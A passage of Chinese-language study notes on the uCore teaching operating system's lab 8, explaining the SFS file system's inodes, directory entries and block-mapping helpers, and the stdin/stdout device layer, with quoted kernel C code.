*/</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><blockquote><p>magic number就是一串神秘莫测的数字, 这里用来标识SFS文件系统, 值为0x2f8dbe2a</p></blockquote><p>需要注意的是虽然inode的大小小于一个块的大小（4096B），<strong>但为了实现简单，每个 inode 都占用一个完整的 block。</strong> </p><p>在sfs_fs.c文件中的<code>sfs_do_mount</code>函数中，完成了加载位于硬盘上的SFS文件系统的超级块superblock和freemap的工作。这样，在内存中就有了SFS文件系统的全局信息。</p><h4 id="索引节点"><a href="#索引节点" class="headerlink" title="索引节点"></a>索引节点</h4><p>在<code>sfs</code>层面上，<code>inode</code>结构既可表示文件<code>file</code>、目录<code>dir</code>，也可表示设备<code>device</code>。而区分<code>inode</code>结构的操作有两种，一种是其<code>in_info</code>成员变量，另一种是该结构的成员指针<code>in_ops</code>。以下是函数<code>sfs_get_ops</code>的源码，该函数返回某个属性（文件/目录）所对应的<code>inode</code>操作：</p><blockquote><p>注意，设置inode_ops的操作不止一处，以下代码只作为示例。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_get_ops - return function addr of fs_node_dirops/sfs_node_fileops</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> struct inode_ops *</span><br><span class="hljs-function"><span class="hljs-title">sfs_get_ops</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> type)</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span> (type) &#123;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_DIR:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_dirops;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_FILE:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_fileops;<br>    &#125;<br>    panic(<span class="hljs-string">&quot;invalid file type %d.\n&quot;</span>, type);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>当uCore创建一个<strong>用于存储文件/目录</strong>的<code>inode</code>结构（即该<code>inode</code>结构的<code>in_info</code>成员变量为<code>sfs_inode</code>类型）时，程序会执行函数<code>sfs_create_inode</code>。该函数会<strong>将<code>inode</code>结构中的<code>sfs_inode</code>成员与磁盘对应结点<code>sfs_disk_inode</code>相关联</strong>，从而使得只凭<code>inode</code>即可操作该结点。 </p><blockquote><p>比如在打开文件的时候, 需要调用<code>sfs_dirent_search_nolock</code>查找路径对应inode, 如果找到了会返回ino编号, 然后调用<code>sfs_load_inode</code>根据ino和sfs找到对应inode, 把对应<code>sfs_disk_inode</code>读到内存中, 然后调用**<code>sfs_create_inode</code>**, 初始化<code>inode</code>里的<code>sfs_inode</code>.</p></blockquote><blockquote><p>用于描述设备<code>device</code>的<code>inode</code>会在其他函数中被初始化，不会执行函数<code>sfs_create_inode</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_create_inode - alloc a inode in memroy, and init din/ino/dirty/reclian_count/sem fields in sfs_inode in inode</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_create_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_disk_inode *din, <span class="hljs-keyword">uint32_t</span> ino, struct inode **node_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span><br>    <span class="hljs-keyword">if</span> ((node = alloc_inode(sfs_inode)) != <span class="hljs-literal">NULL</span>) &#123;<br>        vop_init(node, sfs_get_ops(din-&gt;type), info2fs(sfs, sfs));<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> *<span class="hljs-title">sin</span> =</span> vop_info(node, sfs_inode);<br>        <span class="hljs-built_in">sin</span>-&gt;din = din, <span class="hljs-built_in">sin</span>-&gt;ino = ino, <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">0</span>, <span class="hljs-built_in">sin</span>-&gt;reclaim_count = <span class="hljs-number">1</span>;<br>        sem_init(&amp;(<span class="hljs-built_in">sin</span>-&gt;sem), <span class="hljs-number">1</span>);<br>        *node_store = node;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_NO_MEM;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="磁盘索引节点"><a href="#磁盘索引节点" class="headerlink" title="磁盘索引节点"></a>磁盘索引节点</h5><p>就是<code>sfs_disk_inode </code>, understand结构图中最后一个结构体, <strong>保存在磁盘上</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> size;                                  <span class="hljs-comment">/* size of the file (in bytes) */</span><br>    <span class="hljs-keyword">uint16_t</span> type;                                  <span class="hljs-comment">/* one of SYS_TYPE_* above */</span><br>    <span class="hljs-keyword">uint16_t</span> nlinks;                                <span class="hljs-comment">/* # of hard links to this file */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                <span class="hljs-comment">/* # of blocks */</span><br>    <span class="hljs-keyword">uint32_t</span> direct[SFS_NDIRECT];                   <span class="hljs-comment">/* direct blocks 存储的是ino编号*/</span><br>    <span class="hljs-keyword">uint32_t</span> indirect;                              <span class="hljs-comment">/* indirect blocks */</span><br><span class="hljs-comment">//    uint32_t db_indirect;                           /* double indirect blocks */</span><br><span class="hljs-comment">//   unused</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>对于文件, <u>索引值</u><strong>指向的</strong>是数据块.</p><p>对于目录, <u>索引值</u><strong>指向的</strong>是下面这个结构体。数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* file entry (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_entry</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">//索引节点所占数据块索引值</span><br>    <span class="hljs-keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="hljs-number">1</span>];               <span class="hljs-comment">//文件名</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h5 id="内存索引节点"><a href="#内存索引节点" class="headerlink" title="内存索引节点"></a>内存索引节点</h5><p>即<code>sfs_inode</code>.  需要注意，一个内存inode是在打开一个文件后才创建的，如果关机则相关信息都会消失。<br>而硬盘inode(即<code>sfs_disk_inode</code>)的内容是保存在硬盘中的，只是在进程需要时才被读入到内存中，用于访问文件或目录的具体内容数据</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span>;</span>                     <span class="hljs-comment">/* on-disk inode 一对一指针*/</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">/* inode number */</span><br>    <span class="hljs-keyword">bool</span> dirty;                                     <span class="hljs-comment">/* true if inode modified */</span><br>    <span class="hljs-keyword">int</span> reclaim_count;                              <span class="hljs-comment">/* kill inode if it hits zero */</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;                                <span class="hljs-comment">/* semaphore for din */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_link;                        <span class="hljs-comment">/* entry for linked-list in sfs_fs */</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;                         <span class="hljs-comment">/* entry for hash linked-list in sfs_fs */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>为了方便实现上面提到的多级数据的访问以及目录中 entry 的操作，对 inode SFS实现了一些<strong>辅助的函数</strong>：</p><ol><li><code>sfs_bmap_load_nolock</code>：将对应 sfs_inode 的第 index 个索引指向的 block 的<strong>索引值</strong>取出存到相应的指针指向的单元（ino_store）。该函数只接受 index &lt;= inode-&gt;blocks 的参数。当 index == inode-&gt;blocks 时，该函数理解为需要为 inode 增长一个 block。<strong>并标记 inode 为 dirty</strong>（所有对 inode 数据的修改都要做这样的操作，这样，当 inode 不再使用的时候，sfs 能够保证 inode 数据能够被写回到磁盘）。sfs_bmap_load_nolock 调用的 sfs_bmap_get_nolock 来完成相应的操作, 分为直接索引和间接索引两种情况, <u>完成ino的load操作</u>.（sfs_bmap_get_nolock 只由 sfs_bmap_load_nolock 调用）</li><li><code>sfs_bmap_truncate_nolock</code>：将多级数据索引表的最后一个 entry 释放掉。<strong>他可以认为是 sfs_bmap_load_nolock 中，index == inode-&gt;blocks 的逆操作</strong>(检测到时就会从freemap中alloc一个)。当一个文件或目录被删除时，sfs 会循环调用该函数直到 inode-&gt;blocks 减为 0，释放所有的数据页。函数通过 sfs_bmap_free_nolock 来实现，他应该是 sfs_bmap_get_nolock 的逆操作。和 sfs_bmap_get_nolock 一样，调用 sfs_bmap_free_nolock 也要格外小心。</li><li><code>sfs_dirent_read_nolock</code>：将目录的第 slot 个 entry 读取到指定的内存空间。他通过上面提到的函数来完成。</li><li><code>sfs_dirent_search_nolock</code>：是常用的查找函数。他在目录下查找 name，并且返回相应的搜索结果（文件或文件夹）的 inode 的编号（<strong>也是磁盘编号</strong>），和相应的 entry 在该目录的 index 编号以及目录下的数据页是否有空闲的 entry。（SFS 实现里文件的数据页是连续的，不存在任何空洞；而对于目录，数据页不是连续的，当某个 entry 删除的时候，SFS 通过设置 entry-&gt;ino 为0将该 entry 所在的 block 标记为 free，在需要添加新 entry 的时候，SFS 优先使用这些 free 的 entry，其次才会去在数据页尾追加新的 entry.)</li></ol><blockquote><p> 从下到上表明了他们之间的包含关系. 注意到<code>dirent</code>是指<code>directory entry</code>, 最后两个函数专用于目录</p></blockquote><p><strong>注意，这些后缀为 nolock 的函数，只能在已经获得相应 inode 的semaphore才能调用。</strong> </p><hr><h4 id="Inode的文件-目录操作函数"><a href="#Inode的文件-目录操作函数" class="headerlink" title="Inode的文件,目录操作函数"></a>Inode的文件,目录操作函数</h4><p>这些操作函数使用结构体+函数指针来定义, 在inode结构体中被赋值.</p><ul><li>首先是文件操作函数: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>sfs_openfile不用做什么事；sfs_close需要把对文件的修改内容写回到硬盘上，这样确保硬盘上的文件内容数据是最新的；sfs_read和sfs_write函数都调用了一个函数sfs_io，并最终通过访问硬盘驱动来完成对文件内容数据的读写。</p><ul><li>然后是目录操作函数: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>对于目录操作而言，由于目录也是一种文件，所以sfs_opendir、sys_close对应户进程发出的open、close函数。相对于sfs_open，sfs_opendir只是完成一些open函数传递的参数判断，没做其他更多的事情。目录的close操作与文件的close操作完全一致。由于目录的内容数据与文件的内容数据不同，所以读出目录的内容数据的函数是sfs_getdirentry，其主要工作是获取目录下的文件inode信息。</p><h3 id="5-device层"><a href="#5-device层" class="headerlink" title="5.device层"></a>5.device层</h3><blockquote><p>目前实现了stdin设备文件文件、stdout设备文件、disk0设备。stdin设备就是键盘，stdout设备就是CONSOLE（串口、并口和文本显示器），而disk0设备是承载SFS文件系统的磁盘设备。(无情的复制机器)</p></blockquote><p>为了表示一个设备，需要有对应的数据结构，ucore为此定义了struct device，其描述如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> &#123;</span><br>    <span class="hljs-keyword">size_t</span> d_blocks;    <span class="hljs-comment">//设备占用的数据块个数            </span><br>    <span class="hljs-keyword">size_t</span> d_blocksize;  <span class="hljs-comment">//数据块的大小</span><br>    <span class="hljs-keyword">int</span> (*d_open)(struct device *dev, <span class="hljs-keyword">uint32_t</span> open_flags);  <span class="hljs-comment">//打开设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_close)(struct device *dev); <span class="hljs-comment">//关闭设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_io)(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write); <span class="hljs-comment">//读写设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_ioctl)(struct device *dev, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data); <span class="hljs-comment">//用ioctl方式控制设备的函数指针</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这个数据结构能够支持对块设备（比如磁盘）、字符设备（比如键盘、串口）的表示，完成对设备的基本操作。ucore虚拟文件系统为了把这些设备链接在一起，还定义了一个设备链表，即双向链表<strong>vdev_list</strong>，这样通过访问此链表，可以找到ucore能够访问的所有设备文件。</p><p>但这个设备描述没有与文件系统以及表示一个文件的inode数据结构建立关系，为此，还需要另外一个数据结构把device和inode联通起来，这就是vfs_dev_t数据结构：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// device info entry in vdev_list </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">devnode</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>;</span><br>    <span class="hljs-keyword">bool</span> mountable;<br>    <span class="hljs-keyword">list_entry_t</span> vdev_link;<br>&#125; <span class="hljs-keyword">vfs_dev_t</span>;<br></code></pre></div></td></tr></table></figure><p>利用<code>vfs_dev_t</code>数据结构，就可以让文件系统通过一个链接<code>vfs_dev_t</code>结构的双向链表找到device对应的inode数据结构，一个inode节点的成员变量in_type的值是0x1234，则此 inode的成员变量in_info将成为一个device结构。这样inode就和一个设备建立了联系，这个inode就是一个设备文件。</p><blockquote><p>对于文件来说, inode-&gt;in_info是sfs_inode类型, 记录了文件在磁盘上的信息;<br>而对于设备来说, 是device类型, 存储着针对于device的操作函数和相关信息.1</p></blockquote><h4 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h4><p><strong>初始化</strong> </p><p>既然stdout设备是设备文件系统的文件，自然有自己的inode结构。在系统初始化时，即只需如下处理过程</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kern_init--&gt;fs_init--&gt;dev_init--&gt;dev_init_stdout --&gt; dev_create_inode<br>                 --&gt; stdout_device_init<br>                 --&gt; vfs_add_dev<br></code></pre></div></td></tr></table></figure><p>在dev_init_stdout中完成了对stdout设备文件的初始化。即首先创建了一个inode，然后通过stdout_device_init完成对inode中的成员变量inode-&gt;__device_info进行初始：</p><p>这里的stdout设备文件实际上就是指的console外设（它其实是串口、并口和CGA的组合型外设）。这个设备文件是一个只写设备，如果读这个设备，就会出错。接下来我们看看stdout设备的相关处理过程。</p><p><strong>初始化</strong> </p><p>stdout设备文件的初始化过程主要由stdout_device_init完成，其具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdout_open;<br>    dev-&gt;d_close = stdout_close;<br>    dev-&gt;d_io = stdout_io;<br>    dev-&gt;d_ioctl = stdout_ioctl;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，stdout_open函数完成设备文件打开工作，如果发现用户进程调用open函数的参数flags不是只写（O_WRONLY），则会报错。即<code>stdout_open(struct device *dev, uint32_t open_flags)  </code> </p><p><strong>访问操作实现</strong> </p><p>stdout_io函数完成设备的写操作工作, <strong>具体是从iobuf中一个一个字符输出到串口并口和CGA显示器上</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        <span class="hljs-keyword">char</span> *data = iob-&gt;io_base;<br>        <span class="hljs-keyword">for</span> (; iob-&gt;io_resid != <span class="hljs-number">0</span>; iob-&gt;io_resid --) &#123;<br>            cputchar(*data ++);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，要写的数据放在iob-&gt;io_base所指的内存区域，一直写到iob-&gt;io_resid的值为0为止。每次写操作都是通过cputchar来完成的，此函数最终将通过console外设驱动来完成把数据输出到串口、并口和CGA显示器上过程。另外，也可以注意到，如果用户想执行读操作，则stdout_io函数直接返回错误值**-**E_INVAL。</p><h4 id="stdin"><a href="#stdin" class="headerlink" title="stdin"></a>stdin</h4><p>这里的stdin设备文件实际上就是指的键盘。这个设备文件是一个只读设备，如果写这个设备，就会出错。接下来我们看看stdin设备的相关处理过程。</p><p><strong>初始化</strong> </p><p>stdin设备文件的初始化过程主要由stdin_device_init完成了主要的初始化工作，具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdin_open;<br>    dev-&gt;d_close = stdin_close;<br>    dev-&gt;d_io = stdin_io;<br>    dev-&gt;d_ioctl = stdin_ioctl;<br><span class="hljs-comment">/* 这玩意儿是一个在dev_stdin.c中的全局静态变量, </span><br><span class="hljs-comment">     * 分别是pointer_read_position and p_write_position</span><br><span class="hljs-comment">     * 如果read_pos &lt; write_pos则说明有新字符</span><br><span class="hljs-comment">    p_rpos = p_wpos = 0; </span><br><span class="hljs-comment">    wait_queue_init(wait_queue);</span><br><span class="hljs-comment">&#125;</span><br></code></pre></div></td></tr></table></figure><p>相对于stdout的初始化过程，stdin的初始化相对复杂一些，多了一个stdin_buffer缓冲区，描述缓冲区读写位置的变量p_rpos、p_wpos以及用于等待缓冲区的等待队列wait_queue。在stdin_device_init函数的初始化中，也完成了对p_rpos、p_wpos和wait_queue的初始化。</p><p><strong>访问操作实现</strong> </p><p>stdin_io函数负责完成设备的读操作工作，具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<br>        <span class="hljs-keyword">int</span> ret;<br>        <span class="hljs-keyword">if</span> ((ret = dev_stdin_read(iob-&gt;io_base, iob-&gt;io_resid)) &gt; <span class="hljs-number">0</span>) &#123;<br>            iob-&gt;io_resid -= ret;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，如果是写操作，则stdin_io函数直接报错返回。所以这也进一步说明了此设备文件是只读文件。如果此读操作，则此函数进一步调用dev_stdin_read函数完成对键盘设备的读入操作。dev_stdin_read函数的实现相对复杂一些，主要的流程如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">dev_stdin_read</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-keyword">for</span> (; ret &lt; len; ret ++, p_rpos ++) &#123;<br>        try_again:<br>            <span class="hljs-keyword">if</span> (p_rpos &lt; p_wpos) &#123; <br>                *buf ++ = stdin_buffer[p_rpos % stdin_BUFSIZE];<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//没有新字符就要进行睡眠并且调度</span><br>                <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>                wait_current_set(wait_queue, wait, WT_KBD);<br>                local_intr_restore(intr_flag);<br><br>                schedule();<br><br>                local_intr_save(intr_flag);<br>                wait_current_del(wait_queue, wait);<br>                <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags == WT_KBD) &#123;<br>                    <span class="hljs-keyword">goto</span> try_again;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上述函数中可以看出，如果<code>p_rpos</code> &lt; <code>p_wpos</code>，则表示有键盘输入的新字符在stdin_buffer中，于是就从stdin_buffer中取出新字符放到iobuf指向的缓冲区中；如果<code>p_rpos</code> &gt;=<code>p_wpos</code>，则表明没有新字符，这样调用read用户态库函数的用户进程就需要采用等待队列的睡眠操作进入睡眠状态，等待键盘输入字符的产生。</p><p>键盘输入字符后，如何唤醒等待键盘输入的用户进程呢？回顾lab1中的外设中断处理，可以了解到，当用户敲击键盘时，会产生键盘中断，在trap_dispatch函数中，当识别出中断是键盘中断（中断号为IRQ_OFFSET + IRQ_KBD）时，会调用dev_stdin_write函数，来把字符写入到stdin_buffer中，且会通过等待队列的唤醒操作唤醒正在等待键盘输入的用户进程。</p><h3 id="文件系统初始化"><a href="#文件系统初始化" class="headerlink" title=".文件系统初始化"></a>.文件系统初始化</h3><blockquote><p>指导书写的真好, 又想复制了(</p></blockquote><p>首先看看kern_init函数，可以发现与lab7相比增加了对fs_init函数的调用。fs_init函数就是文件系统初始化的总控函数，它进一步调用了虚拟文件系统初始化函数vfs_init，与文件相关的设备初始化函数dev_init和Simple FS文件系统的初始化函数sfs_init。这三个初始化函数联合在一起，协同完成了整个虚拟文件系统、SFS文件系统和文件系统对应的设备（键盘、串口、磁盘）的初始化工作。其函数调用关系图如下所示：</p><p><img src="../../image/ucore/image-20220107165956521.png" alt="image-20220107165956521"></p><p>参考上图，并结合源码分析，可大致了解到文件系统的整个初始化流程。</p><ul><li>vfs_init主要建立了一个device list双向链表vdev_list，为后续具体设备（键盘、串口、磁盘）以文件的形式呈现建立查找访问通道。</li><li>dev_init函数通过进一步调用disk0/stdin/stdout_device_init完成对具体设备的初始化，把它们抽象成一个设备文件，并建立对应的inode数据结构，最后把它们链入到vdev_list中。这样通过虚拟文件系统就可以方便地以文件的形式访问这些设备了。</li><li>sfs_init是完成对Simple FS的初始化工作，并把此实例文件系统挂在虚拟文件系统中，从而让ucore的其他部分能够通过访问虚拟文件系统的接口来进一步访问到SFS实例文件系统。</li></ul><h2 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-5"><a href="#练习1-5" class="headerlink" title="练习1"></a>练习1</h3><h4 id="openfile"><a href="#openfile" class="headerlink" title="openfile"></a>openfile</h4><blockquote><p>发现没有讲到的路径格式: 